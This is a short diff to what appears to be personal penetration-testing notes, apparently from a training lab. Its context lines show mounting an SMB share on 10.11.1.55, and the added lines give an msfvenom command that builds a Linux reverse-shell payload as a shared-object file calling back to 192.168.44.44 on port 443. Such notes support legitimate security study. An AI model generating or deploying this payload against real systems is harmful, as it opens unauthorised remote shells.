@@ -166,3 +166,6 @@ Mount share:
 mount -t cifs //10.11.1.55//Bob\ Shard ./smb
 
 mount -t cifs -o vers=1.0 //10.11.1.55/"Bob Shard"  smb #this is how it actually worked :)
+
+SO file with msfvenom:
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.44.44 LPORT=443 -f elf-so > exec.so
